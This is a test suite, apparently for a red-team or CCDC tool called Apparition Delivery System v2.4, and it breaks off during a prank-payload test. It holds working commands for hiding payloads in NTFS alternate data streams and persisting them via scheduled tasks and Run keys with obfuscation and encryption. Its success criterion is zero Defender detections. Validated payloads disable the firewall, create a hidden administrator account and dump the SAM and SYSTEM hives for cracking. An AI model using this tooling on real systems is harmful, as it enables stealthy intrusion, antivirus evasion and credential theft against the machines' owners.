# COMPREHENSIVE TEST SUITE — Apparition Delivery System v2.4

**Master validation suite covering every feature and use case.**

**Last Updated:** 2026-02-25
**Covers:** ADS-OneLiner.ps1 + ADS-Dropper.ps1 — v2.4 parameter set
**Previous suite:** archived at `docs/archive/COMPREHENSIVE-TEST-SUITE-v2.3.md`

---

## Quick Status Reference

| Test | Description | Status |
|------|-------------|--------|
| T-P0-1 to T-P0-7 | Linux pre-flight (syntax, params, output) | Run before every VM session |
| T-BASE-1 to T-BASE-6 | Baseline unencrypted deployments | T1/T4 CONFIRMED PASS (Session 15) |
| T-ENC-1 to T-ENC-3 | Encryption regression (BUG-011) | T3-v2/T11-v2 CONFIRMED PASS (Session 16) |
| T-OBF-1 to T-OBF-4 | Obfuscation tiers | T4-v2 Advanced+Paranoid PASS (Session 15) |
| T-PAY-1 to T-PAY-7 | Validated payload categories | T8/T9/T10/M1-M4 PASS (2026-02-19) |
| T-CLN-1 to T-CLN-3 | Cleanup verification | — |

---

## Table of Contents

1. [Phase 0: Linux Pre-Flight (No VM, ~5 min)](#phase-0-linux-pre-flight)
2. [Phase 1: Baseline Unencrypted Deployments](#phase-1-baseline-unencrypted)
3. [Phase 2: Encryption Regression (BUG-011)](#phase-2-encryption-regression)
4. [Phase 3: Obfuscation Tiers](#phase-3-obfuscation-tiers)
5. [Phase 4: Payload Categories](#phase-4-payload-categories)
6. [Phase 5: Cleanup Verification](#phase-5-cleanup-verification)
7. [Common Verification Commands](#common-verification-commands)
8. [VM Snapshot Workflow](#vm-snapshot-workflow)
9. [Clean VM Checklist](#clean-vm-checklist)

---

# Phase 0: Linux Pre-Flight

**Environment:** Kali/Linux with `pwsh` installed
**Working Directory:** Project root
**Goal:** Catch syntax errors and parameter issues before touching the VM. Run all Phase 0 tests before any VM work.
**Time:** ~5 minutes

---

## T-P0-1: Basic Generation (Smoke Test)

```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'Write-Host test' \
  -OutputFile /tmp/p0-smoke.txt && echo "PASS: Generated" || echo "FAIL"
```

**PASS if:** File created, no errors, contains "OPTION 1".

```bash
grep -q "OPTION 1" /tmp/p0-smoke.txt && echo "PASS: Output format correct" || echo "FAIL"
```

---

## T-P0-2: All Obfuscation Tiers — Syntax Check

```bash
for tier in None Basic Advanced Paranoid; do
  pwsh src/ADS-OneLiner.ps1 \
    -Payload 'Write-Host test' \
    -Obfuscate $tier \
    -OutputFile /tmp/p0-tier-$tier.txt \
    && echo "PASS: $tier" || echo "FAIL: $tier"
done
```

**PASS if:** All four complete without error.

---

## T-P0-3: All Persist Modes

```bash
for mode in task registry none; do
  pwsh src/ADS-OneLiner.ps1 \
    -Payload 'Write-Host test' \
    -Persist $mode \
    -OutputFile /tmp/p0-persist-$mode.txt \
    && echo "PASS: $mode" || echo "FAIL: $mode"
done
```

**PASS if:** All three complete. Check task vs registry vs none content:
```bash
grep -q "Register-ScheduledTask\|SchTasks" /tmp/p0-persist-task.txt && echo "PASS: task has schtask" || echo "FAIL"
grep -q "HKCU\|HKLM" /tmp/p0-persist-registry.txt && echo "PASS: registry has Run key" || echo "FAIL"
```

---

## T-P0-4: All Trigger Types

```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'Write-Host test' \
  -Trigger @('AtLogOn','AtStartup','OnUnlock','OnIdle') \
  -OutputFile /tmp/p0-triggers.txt
grep -q "AtLogOn" /tmp/p0-triggers.txt && echo "PASS: AtLogOn" || echo "FAIL"
grep -q "AtStartup" /tmp/p0-triggers.txt && echo "PASS: AtStartup" || echo "FAIL"
grep -q "StateChange\|OnUnlock" /tmp/p0-triggers.txt && echo "PASS: OnUnlock" || echo "FAIL"
grep -q "IdleTrigger\|OnIdle" /tmp/p0-triggers.txt && echo "PASS: OnIdle" || echo "FAIL"
```

---

## T-P0-5: Jitter + PeriodicMinutes

```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'Write-Host test' \
  -JitterPercent 30 \
  -PeriodicMinutes 10 \
  -OutputFile /tmp/p0-jitter.txt
# Jitter = 30% of 10min = 3min = PT3M in ISO 8601
grep -q "PT3M\|PT.*M" /tmp/p0-jitter.txt && echo "PASS: ISO 8601 jitter found" || echo "FAIL"
grep -q "Jitter.*30\|30.*Jitter" /tmp/p0-jitter.txt && echo "PASS: Jitter in summary" || echo "FAIL"
```

---

## T-P0-6: Multi-Instance + Encryption

```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'Write-Host test' \
  -InstanceCount 3 \
  -Encrypt \
  -OutputFile /tmp/p0-multi-enc.txt && echo "PASS" || echo "FAIL"
grep -q "Instances: 3\|InstanceCount: 3\|3.*instance" /tmp/p0-multi-enc.txt && echo "PASS: Instance count" || echo "FAIL"
grep -q "EncodedCommand" /tmp/p0-multi-enc.txt && echo "PASS: _wrapEC found" || echo "FAIL"
```

**PASS if:** EncodedCommand appears (confirms _wrapEC is active for -Encrypt).

---

## T-P0-7: PayloadFile + ZeroWidthStreams + Paranoid

```bash
echo 'Write-Host "from file"' > /tmp/p0-payload.ps1
pwsh src/ADS-OneLiner.ps1 \
  -PayloadFile /tmp/p0-payload.ps1 \
  -Obfuscate Paranoid \
  -OutputFile /tmp/p0-paranoid.txt && echo "PASS: Generated" || echo "FAIL"
```

**PASS if:** Completes without error. Manifest saved in `./manifests/`.

---

# Phase 1: Baseline Unencrypted Deployments

**Environment:** Windows VM (Windows 10/11 or Server 2019/2022)
**Admin rights:** Required for task persistence tests
**Workflow:** Restore clean snapshot between each test

Canary for task tests: `C:\Windows\Temp\ads-TESTID-ok.txt` (SYSTEM writes here)
Canary for registry tests: `$env:ProgramData\ads-TESTID-ok.txt` (neutral context)

---

## T-BASE-1: Default Advanced — Task Persist

**Goal:** Validate default behavior end-to-end.

**GENERATE (Kali):**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-base1-ok.txt" -ItemType File -Force | Out-Null' \
  -Obfuscate Advanced \
  -Persist task \
  -OutputFile /tmp/base1.txt
```

**PRE-DEPLOY CHECK:**
```bash
grep -q "Advanced" /tmp/base1.txt && echo "PASS: tier" || echo "FAIL"
grep -c "wscript" /tmp/base1.txt
```

**DEPLOY (Windows — as Administrator):** Paste OPTION 1 from `/tmp/base1.txt`

**VERIFY:**
```powershell
# Find task (name is obfuscated from word list)
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Write-Host "Task: $tn"

# Check ADS host file (deep placement — WER or Diagnosis dir)
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\WER' -Recurse -File -EA 0 |
  ForEach-Object { $s = Get-Item $_.FullName -Stream * -EA 0 | Where-Object { $_.Stream -ne ':$DATA' }; if($s) { Write-Host "ADS: $($_.FullName)" } }

# Fire the task manually
Start-ScheduledTask -TaskName $tn
Start-Sleep 5

# Verify canary
Test-Path 'C:\Windows\Temp\ads-base1-ok.txt' && Write-Host "PASS: canary found" || Write-Host "FAIL: canary missing"

# Defender check
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 5 |
  Where-Object { $_.Id -eq 1116 } | Select-Object TimeCreated, Message | Format-List
```

**PASS CRITERIA:**
- Task created, name from word list (not `SystemOptimization`)
- ADS in deep WER/Cache directory (not `C:\ProgramData\SystemCache.dat`)
- Canary at `C:\Windows\Temp\ads-base1-ok.txt`
- Zero Event 1116 (Defender detection) after deployment and execution

**CLEANUP:**
```powershell
Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA 0
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' -EA 0 | Remove-Item -Force
Remove-Item 'C:\Windows\Temp\ads-base1-ok.txt' -Force -EA 0
```

---

## T-BASE-2: Basic Tier — Registry Persist

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "$env:ProgramData\ads-base2-ok.txt" -ItemType File -Force | Out-Null' \
  -Obfuscate Basic \
  -Persist registry \
  -OutputFile /tmp/base2.txt
```

**DEPLOY (Windows — as Administrator or standard user):** Paste OPTION 1

**VERIFY:**
```powershell
# Check HKCU Run key
$run = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$run | Format-List

# Check HKLM Run key (if admin)
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA 0 | Format-List

# Find companion task
$ctn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Start-ScheduledTask -TaskName $ctn
Start-Sleep 5

Test-Path "$env:ProgramData\ads-base2-ok.txt" && Write-Host "PASS: canary" || Write-Host "FAIL"
```

**PASS CRITERIA:** HKCU Run key set, companion task created, canary written.

**CLEANUP:**
```powershell
$vn = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run').PSObject.Properties.Name |
  Where-Object { $_ -notmatch 'OneDrive|MicrosoftEdge|SecurityHealth' } | Select-Object -Last 1
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $vn -EA 0
Remove-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $vn -EA 0
Unregister-ScheduledTask -TaskName $ctn -Confirm:$false -EA 0
Remove-Item "$env:ProgramData\ads-base2-ok.txt" -Force -EA 0
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' -EA 0 | Remove-Item -Force
```

---

## T-BASE-3: None Tier — Backward Compat

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-base3-ok.txt" -ItemType File -Force | Out-Null' \
  -Obfuscate None \
  -Persist task \
  -OutputFile /tmp/base3.txt
grep "SystemOptimization" /tmp/base3.txt && echo "PASS: fixed task name" || echo "FAIL"
grep "SystemCache.dat" /tmp/base3.txt && echo "PASS: fixed host path" || echo "FAIL"
```

**DEPLOY + VERIFY:**
```powershell
Get-ScheduledTask -TaskName 'SystemOptimization' | Format-List
Get-Item 'C:\ProgramData\SystemCache.dat' -Stream * -EA 0
Start-ScheduledTask 'SystemOptimization'; Start-Sleep 5
Test-Path 'C:\Windows\Temp\ads-base3-ok.txt' && Write-Host "PASS" || Write-Host "FAIL"
```

**PASS CRITERIA:** Task name = `SystemOptimization`, host file = `C:\ProgramData\SystemCache.dat`, canary written.

**CLEANUP:**
```powershell
Unregister-ScheduledTask 'SystemOptimization' -Confirm:$false -EA 0
Remove-Item 'C:\ProgramData\SystemCache.dat' -Force -EA 0
Get-ChildItem 'C:\ProgramData' -Filter '*.js' -EA 0 | Remove-Item -Force
Remove-Item 'C:\Windows\Temp\ads-base3-ok.txt' -Force -EA 0
```

---

## T-BASE-4: OnUnlock Trigger Only

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-base4-ok.txt" -ItemType File -Force | Out-Null' \
  -Trigger @('OnUnlock') \
  -Persist task \
  -OutputFile /tmp/base4.txt
grep -q "StateChange\|WorkstationUnlock\|OnUnlock" /tmp/base4.txt && echo "PASS: trigger present" || echo "FAIL"
```

**VERIFY (Windows):** Deploy → lock screen → unlock → wait 5s → check canary.
```powershell
# Also fire manually to confirm execution works
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Start-ScheduledTask $tn; Start-Sleep 5
Test-Path 'C:\Windows\Temp\ads-base4-ok.txt' && Write-Host "PASS" || Write-Host "FAIL"
```

---

## T-BASE-5: Jitter + PeriodicMinutes Custom

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-base5-ok.txt" -ItemType File -Force | Out-Null' \
  -JitterPercent 25 \
  -PeriodicMinutes 10 \
  -OutputFile /tmp/base5.txt
```

**VERIFY (Windows):**
```powershell
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
$task = Get-ScheduledTask -TaskName $tn
# 25% of 10min = 2.5min → PT2M30S or PT2.5M (implementation rounds)
$task.Triggers | ForEach-Object {
  Write-Host "$($_.CimClass.CimClassName): Delay=$($_.Delay) RandomDelay=$($_.RandomDelay)"
}
# Check periodic trigger has RandomDelay set
$pt = $task.Triggers | Where-Object { $_.CimClass.CimClassName -eq 'MSFT_TaskTimeTrigger' }
Write-Host "Periodic RandomDelay: $($pt.RandomDelay)"
```

**PASS CRITERIA:** Periodic trigger `RandomDelay` = `PT2M` or `PT2M30S` (ISO 8601), event-based triggers have `Delay` set.

---

## T-BASE-6: Multi-Instance (InstanceCount 3)

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'Add-Content "C:\Windows\Temp\ads-base6-ok.txt" "instance-$(Get-Random)"' \
  -InstanceCount 3 \
  -OutputFile /tmp/base6.txt
```

**VERIFY (Windows — as Administrator):**
```powershell
# Should find 3 non-Microsoft tasks
$tasks = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' }
Write-Host "Task count: $($tasks.Count)"
if ($tasks.Count -eq 3) { Write-Host "PASS: 3 instances" } else { Write-Host "FAIL: expected 3" }

# Fire all three
$tasks | ForEach-Object { Start-ScheduledTask $_.TaskName }
Start-Sleep 8
$lines = (Get-Content 'C:\Windows\Temp\ads-base6-ok.txt' -EA 0).Count
if ($lines -eq 3) { Write-Host "PASS: 3 executions" } else { Write-Host "FAIL: got $lines" }
```

**PASS CRITERIA:** 3 tasks with unique names created, each writes a separate line to canary.

**CLEANUP:**
```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' } |
  ForEach-Object { Unregister-ScheduledTask $_.TaskName -Confirm:$false }
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' -EA 0 | Remove-Item -Force
Remove-Item 'C:\Windows\Temp\ads-base6-ok.txt' -Force -EA 0
```

---

# Phase 2: Encryption Regression (BUG-011)

**Goal:** Confirm ClickFix.TFC fix (_wrapEC) holds. These are regression tests — confirmed passing; re-run after any OneLiner changes.

**Current status:**
- T-ENC-1 (T3-v2 equivalent): CONFIRMED PASS Session 16
- T-ENC-2 (T11-v2 equivalent): CONFIRMED PASS Session 16
- T-ENC-3 (T-REG-ENC): Pending re-validation with Change D

---

## T-ENC-1: Encrypt + Task Persist (BUG-011 Regression)

**Regression for:** T3-v2 / Changes B+C (JScript _wrapEC). Confirmed PASS Session 16.

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-enc1-ok.txt" -ItemType File -Force | Out-Null' \
  -Encrypt \
  -Persist task \
  -Obfuscate Advanced \
  -OutputFile /tmp/enc1.txt
# Pre-deploy check: EncodedCommand must appear in JScript section
grep -c "EncodedCommand" /tmp/enc1.txt
```

**Expected:** At least 1 occurrence of `EncodedCommand` (confirms _wrapEC is active).

**DEPLOY + VERIFY (Windows):**
```powershell
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName

# Check JScript action — should call wscript.exe with a .js file
$action = (Get-ScheduledTask $tn).Actions[0]
Write-Host "Program: $($action.Execute)"
Write-Host "Args: $($action.Arguments)"

# Fire task
Start-ScheduledTask $tn
Start-Sleep 8

# Canary
Test-Path 'C:\Windows\Temp\ads-enc1-ok.txt' && Write-Host "PASS: canary" || Write-Host "FAIL"

# Defender check (critical)
$events = Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20 -EA 0 |
  Where-Object { $_.Id -eq 1116 }
if ($events.Count -eq 0) { Write-Host "PASS: Defender CLEAN" } else { Write-Host "FAIL: $($events.Count) detection(s)" }
```

**PASS CRITERIA:**
- Task action calls `wscript.exe` with a `.js` file path (JScript wrapper)
- Canary written at `C:\Windows\Temp\ads-enc1-ok.txt`
- Zero Defender Event 1116 after deployment and execution
- No ClickFix.TFC or PShellCobStager.A events

---

## T-ENC-2: Encrypt + Paranoid + Task (BUG-011 + ZW Regression)

**Regression for:** T11-v2. Confirmed PASS Session 16.

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-enc2-ok.txt" -ItemType File -Force | Out-Null' \
  -Encrypt \
  -Obfuscate Paranoid \
  -Persist task \
  -OutputFile /tmp/enc2.txt
grep -c "EncodedCommand" /tmp/enc2.txt
```

**DEPLOY + VERIFY:**
```powershell
# Find task — Paranoid tier puts ZW chars in name
$task = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' } | Select-Object -First 1
$tn = $task.TaskName
# Verify ZW chars in task name
$cp = ($tn.ToCharArray() | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
if ($cp -match 'U\+200[BCD]|U\+FEFF') { Write-Host "PASS: ZW in task name" } else { Write-Host "FAIL: no ZW" }

Start-ScheduledTask $tn; Start-Sleep 8
Test-Path 'C:\Windows\Temp\ads-enc2-ok.txt' && Write-Host "PASS: canary" || Write-Host "FAIL"

$det = Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20 -EA 0 | Where-Object { $_.Id -eq 1116 }
if ($det.Count -eq 0) { Write-Host "PASS: Defender CLEAN" } else { Write-Host "FAIL: $($det.Count) detection(s)" }
```

---

## T-ENC-3: Encrypt + Registry Persist (Change D Regression — T-REG-ENC)

**Regression for:** T-REG-ENC / Change D ($\_regCmd _wrapEC fix). Status: PENDING re-validation.

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "$env:ProgramData\ads-enc3-ok.txt" -ItemType File -Force | Out-Null' \
  -Encrypt \
  -Persist registry \
  -Trigger AtLogOn \
  -Obfuscate Advanced \
  -OutputFile /tmp/enc3.txt

# Pre-deploy check: registry Run key section must use -EncodedCommand (Change D)
echo "=== Registry regCmd section ==="
grep -A2 "Set-ItemProperty.*Run" /tmp/enc3.txt | head -20
# MUST show -EncodedCommand, NOT -Command with DPAPI compound inline
```

**DEPLOY (Windows — as Administrator):** Paste OPTION 1

**VERIFY — Phase 1 (companion task):**
```powershell
# Confirm registry Run key uses -EncodedCommand (Change D check)
$runKey = Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$runKey.PSObject.Properties | Where-Object { $_.MemberType -eq 'NoteProperty' -and $_.Name -notmatch 'PS' } |
  ForEach-Object { Write-Host "Name: $($_.Name)"; Write-Host "Value: $($_.Value)" }
# Value must contain -EncodedCommand, NOT -Command "..."

# Find companion task
$ctn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Start-ScheduledTask $ctn; Start-Sleep 8

Test-Path "$env:ProgramData\ads-enc3-ok.txt" && Write-Host "PASS: companion canary" || Write-Host "FAIL"

$det = Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 10 -EA 0 | Where-Object { $_.Id -eq 1116 }
if ($det.Count -eq 0) { Write-Host "PASS: Defender CLEAN" } else { Write-Host "FAIL: $($det.Count) detection(s)" }
```

**VERIFY — Phase 2 (P0.5 Logon Gate — the critical check):**
```
1. Sign out of Windows
2. Sign back in
3. Immediately check Defender events:
```
```powershell
Start-Sleep 10  # Give task time to fire
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 20 -EA 0 |
  Where-Object { $_.Id -in @(1116, 1117) } |
  Select-Object TimeCreated, @{n='Name';e={$_.Properties[7].Value}} | Format-List
```

**PASS CRITERIA (P0.5 gate):**
- Registry Run key value contains `-EncodedCommand` (not `-Command "..."`)
- Companion task fires clean
- Canary at `$env:ProgramData\ads-enc3-ok.txt`
- Zero Event 1116/1117 after natural logon — Change D confirmed

**CLEANUP:**
```powershell
$vn = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run').PSObject.Properties.Name |
  Where-Object { $_ -notmatch 'OneDrive|MicrosoftEdge|SecurityHealth' } | Select-Object -Last 1
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $vn -EA 0
Remove-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $vn -EA 0
Unregister-ScheduledTask $ctn -Confirm:$false -EA 0
Remove-Item "$env:ProgramData\ads-enc3-ok.txt" -Force -EA 0
Get-ChildItem 'C:\ProgramData' -Recurse -Filter '*.js' -EA 0 | Remove-Item -Force
```

---

# Phase 3: Obfuscation Tiers

---

## T-OBF-1: None Tier (Fixed Names)

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-obf1-ok.txt" -ItemType File -Force | Out-Null' \
  -Obfuscate None -Persist task -OutputFile /tmp/obf1.txt
grep "SystemOptimization" /tmp/obf1.txt && echo "PASS: fixed task name" || echo "FAIL"
grep "SystemCache.dat" /tmp/obf1.txt && echo "PASS: fixed host path" || echo "FAIL"
```

**PASS CRITERIA:** Task name = `SystemOptimization`, path = `C:\ProgramData\SystemCache.dat`.

---

## T-OBF-2: Basic Tier (Word-List Names, ProgramData Root)

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-obf2-ok.txt" -ItemType File -Force | Out-Null' \
  -Obfuscate Basic -Persist task -OutputFile /tmp/obf2.txt
# Task name should be from word list but NOT SystemOptimization
grep -v "SystemOptimization" /tmp/obf2.txt | grep -q "Task\|Service\|Monitor" && echo "PASS: word-list name" || echo "WARN: check manually"
```

**VERIFY (Windows):**
```powershell
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Write-Host "Task name: $tn"  # Should be readable (Disk*, Memory*, etc.)
# Host file should be in C:\ProgramData root (not deep)
Get-ChildItem 'C:\ProgramData' -Filter '*.dat' | Format-Table Name, FullName
Start-ScheduledTask $tn; Start-Sleep 5
Test-Path 'C:\Windows\Temp\ads-obf2-ok.txt' && Write-Host "PASS" || Write-Host "FAIL"
```

---

## T-OBF-3: Advanced Tier (Deep Placement)

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-obf3-ok.txt" -ItemType File -Force | Out-Null' \
  -Obfuscate Advanced -Persist task -OutputFile /tmp/obf3.txt
```

**VERIFY (Windows):**
```powershell
# Host file should be in deep directory (WER, Diagnosis, etc.)
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
$action = (Get-ScheduledTask $tn).Actions[0]
$jsPath = if ($action.Arguments -match '"([^"]+\.js)"') { $Matches[1] } else { $action.Arguments }
Write-Host "JScript path: $jsPath"
# Should be in C:\ProgramData\Microsoft\Windows\WER or similar deep path
if ($jsPath -match 'WER|Diagnosis|GameExplorer|Microsoft\\Windows') {
  Write-Host "PASS: deep placement"
} else {
  Write-Host "WARN: check if attached to existing file instead"
}
Start-ScheduledTask $tn; Start-Sleep 5
Test-Path 'C:\Windows\Temp\ads-obf3-ok.txt' && Write-Host "PASS: canary" || Write-Host "FAIL"
```

---

## T-OBF-4: Paranoid Tier (ZW Streams + Attach-to-Existing)

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'New-Item "C:\Windows\Temp\ads-obf4-ok.txt" -ItemType File -Force | Out-Null' \
  -Obfuscate Paranoid -Persist task -OutputFile /tmp/obf4.txt
```

**VERIFY (Windows):**
```powershell
$task = Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' } | Select-Object -First 1
$tn = $task.TaskName
# Check for ZW chars in task name
$cp = ($tn.ToCharArray() | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
Write-Host "Task codepoints: $cp"
if ($cp -match 'U\+200[BCD]|U\+FEFF|U\+2060') {
  Write-Host "PASS: ZW chars in task name"
} else {
  Write-Host "FAIL: no ZW chars in task name"
}

Start-ScheduledTask $tn; Start-Sleep 5
Test-Path 'C:\Windows\Temp\ads-obf4-ok.txt' && Write-Host "PASS: canary" || Write-Host "FAIL"
```

**PASS CRITERIA:** ZW Unicode codepoints present in task name. Canary written. Manifest saved.

---

# Phase 4: Payload Categories

**Goal:** Validate key payloads from the library work end-to-end.
**Library:** `ops/payloads/ccdc-library.ps1`

---

## T-PAY-1: FW-002 — Firewall Disable (VM-Validated 2026-02-19)

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'cmd /c "netsh advfirewall set allprofiles state off"' \
  -Obfuscate Advanced \
  -OutputFile /tmp/pay-fw.txt
```

**VERIFY (Windows):**
```powershell
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Start-ScheduledTask $tn; Start-Sleep 5
# Check firewall state
(Get-NetFirewallProfile).Enabled | ForEach-Object { if ($_) { "FAIL: FW still enabled" } else { "PASS: FW disabled" } }
```

**STATUS: VM-Validated 2026-02-19 (T8). DEPLOY=OK, DEFENDER=CLEAN, FW_DISABLED=YES**

---

## T-PAY-2: USR-002 — Hidden Admin (VM-Validated 2026-02-19)

**GENERATE:**
```bash
cat > /tmp/usr002.ps1 << 'EOF'
cmd /c "net user svcUpdate Pa$$w0rd2026! /add & net localgroup Administrators svcUpdate /add"
$p='HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
if(!(Test-Path $p)){New-Item -Path $p -Force|Out-Null}
New-ItemProperty -Path $p -Name svcUpdate -Value 0 -PropertyType DWord -Force|Out-Null
EOF
pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/usr002.ps1 -Obfuscate Advanced -OutputFile /tmp/pay-usr.txt
```

**VERIFY (Windows):**
```powershell
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Start-ScheduledTask $tn; Start-Sleep 8
# Check user was created
net user svcUpdate
# Check user is hidden from login screen
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name svcUpdate -EA 0
# Check admin group
net localgroup Administrators
```

**STATUS: VM-Validated 2026-02-19 (T9). DEPLOY=OK, DEFENDER=CLEAN, USER_CREATED=YES**

**CLEANUP:** `net user svcUpdate /delete`

---

## T-PAY-3: CRED-001 — SAM/SYSTEM Dump (VM-Validated 2026-02-19)

**GENERATE:**
```bash
pwsh src/ADS-OneLiner.ps1 \
  -Payload 'cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"' \
  -Obfuscate Advanced \
  -OutputFile /tmp/pay-cred.txt
```

**VERIFY (Windows):**
```powershell
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Start-ScheduledTask $tn; Start-Sleep 8
Test-Path 'C:\ProgramData\s.dat' && Write-Host "PASS: SAM hive" || Write-Host "FAIL"
(Get-Item 'C:\ProgramData\s.dat').Length | ForEach-Object { Write-Host "SAM size: $_ bytes" }
Test-Path 'C:\ProgramData\sy.dat' && Write-Host "PASS: SYSTEM hive" || Write-Host "FAIL"
```

**Crack on Kali:** `secretsdump.py -sam s.dat -system sy.dat LOCAL`

**STATUS: VM-Validated 2026-02-19 (T10). DEPLOY=OK, DEFENDER=CLEAN, SAM_HIV_SIZE=45056**

**CLEANUP:** `Remove-Item C:\ProgramData\s.dat, C:\ProgramData\sy.dat -Force`

---

## T-PAY-4: MEME-006 — Clipboard Rickroll (VM-Validated 2026-02-19)

**GENERATE:**
```bash
cat > /tmp/meme006.ps1 << 'EOF'
Add-Type -AssemblyName PresentationCore
while($true) {
  [Windows.Clipboard]::SetText('Never gonna give you up! - Red Team was here')
  Start-Sleep -Seconds 30
}
EOF
pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/meme006.ps1 -Obfuscate Basic -OutputFile /tmp/pay-clip.txt
```

**VERIFY (Windows):**
```powershell
$tn = (Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' })[0].TaskName
Start-ScheduledTask $tn; Start-Sleep 35
Get-Clipboard  # Should show the red team message
```

**STATUS: VM-Validated 2026-02-19 (M1). DEPLOY=OK, DEFENDER=CLEAN**
**NOTE: Works from Task Scheduler (SYSTEM context — shared clipboard).**

---

## T-PAY-5: MEME-005 — Caps Lock Disco (VM-Validated 2026-02-19)

**GENERATE:**
```bash
cat > /tmp/meme005.ps1 << 'EOF'
$wsh = New-Object -ComObject WScript.Shell
$end = (Get-Date).AddSeconds(60)
while ((Get-Date) -lt $end) {
  $wsh.SendKeys('{CAPSLOCK}')
  $wsh.SendKeys('{NUMLOCK}')
  $wsh.SendKeys('{SCROLLLOCK}')
  Start-Sleep -Milliseconds 300
}
EOF
pwsh src/ADS-OneLiner.ps1 -PayloadFile /tmp/meme005.ps1 -Obfuscate Basic -OutputFile /tmp/pay-caps.txt
```

**VERIFY:** Deploy → keyboard LEDs blink for 60 seconds. **STATUS: VM-Validated 2026-02-19 (M2)**

---

## T-PAY-6: MEME-002 — Wall of Notepads (registry persist required)

**NOTE: Must use `-Persist registry` — opens in user session. AtLogOn task runs in Session 0 (invisible).**

**GENERATE:**
```bash
cat > /tmp/meme002.ps1 << 'EOF'
1..10 | ForEach-Object {
  Start-Process notepad -ArgumentList "/A`nRED TEAM WAS HERE — ADS v2.4`n`nCheck your ADS streams 👻"
  Start-Sleep -Milliseconds 200
}
EOF
